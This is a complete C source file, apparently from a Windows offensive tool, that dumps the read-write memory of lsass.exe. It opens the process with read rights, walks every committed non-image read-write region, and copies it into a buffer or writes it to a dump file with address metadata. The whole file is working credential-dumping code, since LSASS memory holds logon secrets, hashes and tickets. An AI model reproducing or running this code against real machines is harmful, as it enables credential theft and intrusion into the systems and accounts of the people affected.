/*****************************************************************************************************
*                                                                                                    *
*  File:         DumpWholeMem.c                                                                      *
*  Purpose:      Performs full dumping of lsass.exe RW memory.                                       *
*                                                                                                    *
******************************************************************************************************/
#include "DumpWholeMem.h"
#include "Common.h"

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     USERLAND_VA_BOUNDARY                                                                *
*  Purpose:      The virtual address boundary for userland.                                          *
*                                                                                                    *
******************************************************************************************************/
#if defined(_WIN64)
#define USERLAND_VA_BOUNDARY ((PBYTE)0x00007fffffff0000)
#else
#define USERLAND_VA_BOUNDARY ((PBYTE)0x80000000)
#endif

/*****************************************************************************************************
*                                                                                                    *
*  Structure:    MEM_REGION_CONTEXT                                                                  *
*  Purpose:      Saves a memory region context.                                                      *
*                                                                                                    *
******************************************************************************************************/
typedef struct _MEM_REGION_CONTEXT
{
    PBYTE pcCurrBaseAddress;
    DWORD cbRegionSize;
    PBYTE pcBuffer;
    DWORD cbCurrBufferCapacity;
} MEM_REGION_CONTEXT, *PMEM_REGION_CONTEXT;

/*****************************************************************************************************
*                                                                                                    *
*  Function:     dumpwholemem_IsMemoryRegionContextFinished                                          *
*  Purpose:      Indicates whether the memory region context is finished all memory regions.         *
*  Parameters:   - ptRegionContext - the memory region context.                                      *
*  Returns:      TRUE if finished, FALSE otherwise.                                                  *
*                                                                                                    *
******************************************************************************************************/
static
BOOL
dumpwholemem_IsMemoryRegionContextFinished(
    __in __notnull PMEM_REGION_CONTEXT ptRegionContext
)
{
    // Indicate based on the region size
    return 0 == ptRegionContext->cbRegionSize;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     dumpwholemem_FreeMemoryRegionContext                                                *
*  Purpose:      Frees the given memory region context resources.                                    *
*  Parameters:   - ptRegionContext - the memory region context.                                      *
*                                                                                                    *
******************************************************************************************************/
static
VOID
dumpwholemem_FreeMemoryRegionContext(
    PMEM_REGION_CONTEXT ptRegionContext
)
{
    // Free region context
    HEAPFREE(ptRegionContext->pcBuffer);
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     dumpwholemem_GetNextMemoryRegion                                                    *
*  Purpose:      Gets the next memory region to dump.                                                *
*  Parameters:   - hLsassProcess - the handle to the lsass.exe process.                              *
*                - ptRegionContext - the memory region context. Gets updated between calls.          *
*  Returns:      A return status.                                                                    *
*  Remarks:      - Call FreeMemoryRegionContext to free region context after finished using it.      *
*                - Use IsMemoryRegionContextFinished to indicate completion.                         *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
static
RETSTATUS
dumpwholemem_GetNextMemoryRegion(
    __in __notnull HANDLE hLsassProcess,
    __inout PMEM_REGION_CONTEXT ptRegionContext
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    MEMORY_BASIC_INFORMATION tMemInfo = { 0 };
    DWORD cbRegionSize = 0;
    SIZE_T cbBytesRead = 0;
    PBYTE pcBuffer = NULL;
    BOOL bFinished = FALSE;

    // Validate arguments
    DEBUG_ASSERT(NULL != hLsassProcess);
    DEBUG_ASSERT(NULL != ptRegionContext);

    // Iterate all addresses starting the given one
    do
    {
        // Query foreign memory region
        if (0 == VirtualQueryEx(hLsassProcess, ptRegionContext->pcCurrBaseAddress, &tMemInfo, sizeof(tMemInfo)))
        {
            eStatus = RETSTATUS_FAILURE_MSG(L"VirtualQueryEx() failed (LastError=%lu)", GetLastError());
            goto lblCleanup;
        }

        // Only dump addresses that are committed, not backed by image and are RW
        if ((MEM_COMMIT == tMemInfo.State) &&
            (MEM_IMAGE != tMemInfo.Type) &&
            (PAGE_READWRITE == (PAGE_READWRITE & tMemInfo.Protect)))
        {
            // Optionally allocate a new buffer
            cbRegionSize = (DWORD)(tMemInfo.RegionSize);
            if (ptRegionContext->cbCurrBufferCapacity < cbRegionSize)
            {
                pcBuffer = HEAPALLOCZ(cbRegionSize);
                if (NULL == pcBuffer)
                {
                    eStatus = RETSTATUS_FAILURE_MSG(L"HeapAlloc() failed (cbRegionSize=%lu)", cbRegionSize);
                    goto lblCleanup;
                }
                ptRegionContext->cbCurrBufferCapacity = cbRegionSize;
                HEAPFREE(ptRegionContext->pcBuffer);
                ptRegionContext->pcBuffer = pcBuffer;
                pcBuffer = NULL;
            }

            // Read foreign memory
            if ((!ReadProcessMemory(hLsassProcess, tMemInfo.BaseAddress, ptRegionContext->pcBuffer, cbRegionSize, &cbBytesRead))
                && (GetLastError() != ERROR_PARTIAL_COPY))
            {
                eStatus = RETSTATUS_FAILURE_MSG(L"ReadProcessMemory() failed (cbRegionSize=%lu, cbBytesRead=%lu, LastError=%lu)", cbRegionSize, (DWORD)cbBytesRead, GetLastError());
                goto lblCleanup;
            }

            // Under certain scenarios ReadProcessMemory will not read bytes - we skip then
            if (cbBytesRead > 0)
            {
                ptRegionContext->cbRegionSize = (DWORD)cbBytesRead;
                bFinished = TRUE;
            }
        }

        // Advance address to next region
        ptRegionContext->pcCurrBaseAddress = ((PBYTE)tMemInfo.BaseAddress) + tMemInfo.RegionSize;

        // Check if we are done
        if (USERLAND_VA_BOUNDARY <= ptRegionContext->pcCurrBaseAddress)
        {
            ptRegionContext->pcCurrBaseAddress = NULL;
            ptRegionContext->cbRegionSize = 0;
            bFinished = TRUE;
        }

    } while (!bFinished);

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    HEAPFREE(pcBuffer);

    // Return result
    return eStatus;
}


/*****************************************************************************************************
*                                                                                                    *
*  Function:     DUMPWHOLEMEM_DumpToBuffer                                                           *
*                                                                                                    *
******************************************************************************************************/
#pragma warning(push)
#pragma warning(disable:6001)
__success(return >= 0)
RETSTATUS
DUMPWHOLEMEM_DumpToBuffer(
    __in DWORD cbInput,
    __in_bcount(cbInput) __notnull PBYTE pcInput,
    __out PDWORD pcbOutput,
    __out_bcount(*pcbOutput) PBYTE* ppcOutput
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    HANDLE hLsassProcess = NULL;
    MEM_REGION_CONTEXT tMemRegionContext = { 0 };
    PBYTE pcWholeDumpBuffer = NULL;
    DWORD cbWholeDumpSize = 0;
    DWORD cbWholeDumpCapacity = 0;
    PBYTE pcNewBuffer = NULL;
    DWORD cbTotalSize = 0;
    LSASS_HANDLE_FETCH_TYPE eLsassHandleFetchType = LSASS_HANDLE_FETCH_TYPE_INVALID;

    // Validate arguments
    if ((NULL == pcbOutput) || (NULL == ppcOutput))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (pcbOutput=%p, ppcOutput=%p)", pcbOutput, ppcOutput);
        goto lblCleanup;
    }

    // Parse the input
    eStatus = COMMON_GetLsassHandleFetchTypeFromBinaryInput(cbInput, pcInput, &eLsassHandleFetchType);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_GetLsassHandleFetchTypeFromBinaryInput failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Open lsass.exe
    eStatus = COMMON_FetchLsassHandle(eLsassHandleFetchType, &hLsassProcess, NULL, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_FetchLsassHandle failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Allocate initial buffer
    cbWholeDumpCapacity = OUTPUT_BUFFER_INITIAL_SIZE;
    pcWholeDumpBuffer = HEAPALLOCZ(cbWholeDumpCapacity);
    if (NULL == pcWholeDumpBuffer)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"HeapAlloc() failed allocating initial size");
        goto lblCleanup;
    }

    // Get all addresses
    for (;;)
    {
        // Get the next memory region to dump
        eStatus = dumpwholemem_GetNextMemoryRegion(hLsassProcess, &tMemRegionContext);
        if (RETSTATUS_FAILED(eStatus))
        {
            DEBUG_MSG(L"dumpwholemem_GetNextMemoryRegion failed (eStatus=%.8x)", eStatus);
            goto lblCleanup;
        }

        // Optionally bail out
        if (dumpwholemem_IsMemoryRegionContextFinished(&tMemRegionContext))
        {
            break;
        }

        // Optionally reallocate whole memory dump buffer capacity
        cbTotalSize = cbWholeDumpSize + tMemRegionContext.cbRegionSize;
        if (cbTotalSize > cbWholeDumpCapacity)
        {
            cbWholeDumpCapacity *= 2;
            pcNewBuffer = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pcWholeDumpBuffer, cbWholeDumpCapacity);
            if (NULL == pcNewBuffer)
            {
                eStatus = RETSTATUS_FAILURE_MSG(L"HeapReAlloc() failed allocating %lu bytes", cbTotalSize);
                goto lblCleanup;
            }
            pcWholeDumpBuffer = pcNewBuffer;
        }
        
        // Append data to the whole memory dump buffer
        CopyMemory(pcWholeDumpBuffer + cbWholeDumpSize, tMemRegionContext.pcBuffer, tMemRegionContext.cbRegionSize);
        cbWholeDumpSize += tMemRegionContext.cbRegionSize;
    }

    // Success
    *pcbOutput = cbWholeDumpSize;
    *ppcOutput = pcWholeDumpBuffer;
    pcWholeDumpBuffer = NULL;
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    dumpwholemem_FreeMemoryRegionContext(&tMemRegionContext);
    CLOSE_HANDLE(hLsassProcess);
    HEAPFREE(pcWholeDumpBuffer);

    // Return result
    return eStatus;
}
#pragma warning(pop)

/*****************************************************************************************************
*                                                                                                    *
*  Function:     DUMPWHOLEMEM_DumpToDisk                                                             *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
DUMPWHOLEMEM_DumpToDisk(
    __in DWORD nArgs,
    __in_ecount(nArgs) __notnull PWSTR* ppwszArgs
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    WCHAR wszDumpPath[MAX_PATH] = { 0 };
    HANDLE hDumpFile = INVALID_HANDLE_VALUE;
    HANDLE hLsassProcess = NULL;
    MEM_REGION_CONTEXT tMemRegionContext = { 0 };
    DWORD cbBytesWritten = 0;

    // Validate arguments
    if (ARG_INDEX_LSASS_HANDLE_FETCH_TYPE >= nArgs)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid number of arguments");
        goto lblCleanup;
    }
    if (NULL == ppwszArgs)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (ppwszArgs=%p)", ppwszArgs);
        goto lblCleanup;
    }

    // Open lsass.exe
    eStatus = COMMON_FetchLsassHandleFromString(ppwszArgs[ARG_INDEX_LSASS_HANDLE_FETCH_TYPE], &hLsassProcess, NULL, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_FetchLsassHandleFromString failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Expand environment variables to the dump path
    if (0 == ExpandEnvironmentStringsW(ppwszArgs[ARG_INDEX_DUMP_PATH], wszDumpPath, ARRAYSIZE(wszDumpPath)))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"ExpandEnvironmentStringsW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Open the dump file for writing
    hDumpFile = CreateFileW(wszDumpPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (INVALID_HANDLE_VALUE == hDumpFile)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"CreateFileW() failed (wszDumpPath=%ls, LastError=%lu)", wszDumpPath, GetLastError());
        goto lblCleanup;
    }

    // Get all addresses
    for (;;)
    {
        // Get the next memory region to dump
        eStatus = dumpwholemem_GetNextMemoryRegion(hLsassProcess, &tMemRegionContext);
        if (RETSTATUS_FAILED(eStatus))
        {
            DEBUG_MSG(L"dumpwholemem_GetNextMemoryRegion failed (eStatus=%.8x)", eStatus);
            goto lblCleanup;
        }

        // Optionally bail out
        if (dumpwholemem_IsMemoryRegionContextFinished(&tMemRegionContext))
        {
            break;
        }

        // Dump the region
        if ((!WriteFile(hDumpFile, tMemRegionContext.pcBuffer, tMemRegionContext.cbRegionSize, &cbBytesWritten, NULL)) ||
            (tMemRegionContext.cbRegionSize != cbBytesWritten))
        {
            eStatus = RETSTATUS_FAILURE_MSG(L"WriteFile() failed (cbRegionSize=%lu, cbBytesWritten=%lu, LastError=%lu)", tMemRegionContext.cbRegionSize, cbBytesWritten, GetLastError());
            goto lblCleanup;
        }

        // Dump the metadata
        if ((!WriteFile(hDumpFile, &(tMemRegionContext.cbRegionSize), sizeof(tMemRegionContext.cbRegionSize), &cbBytesWritten, NULL)) ||
            (sizeof(tMemRegionContext.cbRegionSize) != cbBytesWritten))
        {
            eStatus = RETSTATUS_FAILURE_MSG(L"WriteFile() failed (LastError=%lu)", GetLastError());
            goto lblCleanup;
        }
        if ((!WriteFile(hDumpFile, (PULONGLONG)(&(tMemRegionContext.pcCurrBaseAddress)), sizeof(ULONGLONG), &cbBytesWritten, NULL)) ||
            (sizeof(ULONGLONG) != cbBytesWritten))
        {
            eStatus = RETSTATUS_FAILURE_MSG(L"WriteFile() failed (LastError=%lu)", GetLastError());
            goto lblCleanup;
        }
    }

    // Flush file
    (VOID)FlushFileBuffers(hDumpFile);

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    dumpwholemem_FreeMemoryRegionContext(&tMemRegionContext);
    CLOSE_FILE_HANDLE(hDumpFile);
    CLOSE_HANDLE(hLsassProcess);
    
    // Return result
    return eStatus;
}
